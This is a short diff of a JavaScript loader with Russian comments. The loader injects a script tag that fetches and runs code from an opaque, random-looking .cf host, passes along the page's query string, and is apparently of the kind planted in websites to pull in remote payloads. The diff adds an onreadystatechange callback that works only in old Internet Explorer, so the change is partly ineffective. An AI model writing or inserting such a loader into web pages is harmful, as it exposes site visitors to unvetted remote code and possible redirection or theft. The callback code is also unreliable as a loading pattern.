@@ -7,8 +7,16 @@ var a=document.createElement("script");
 a.type="text/javascript";
 // устанавливаем атрибут src равным ссылке на ваш скрипт
 a.src="https://www.f10978757764.cf/go-js/48e1476a-b7a7-4733-b07b-a27f1a7412ac?"+window.location.search.substring(1);
-// добавляем свойство textContent, которое содержит код функции, которая вызывается после того, как скрипт загружен и выполнен
-a.textContent = "function() { doSomething(); }";
+// добавляем свойство onreadystatechange, которое проверяет, когда скрипт загружен и выполнен
+a.onreadystatechange = function() {
+// если свойство readyState равно "loaded" или "complete", то скрипт загружен и выполнен
+if (a.readyState == "loaded" || a.readyState == "complete") {
+// удаляем свойство onreadystatechange, чтобы избежать утечки памяти
+a.onreadystatechange = null;
+// выполняем некоторые действия, которые зависят от вашего скрипта
+doSomething();
+}
+};
 var b=document.getElementsByTagName("script")[0];
 b.parentNode.insertBefore(a,b); // используем метод insertBefore как в оригинале
 }();
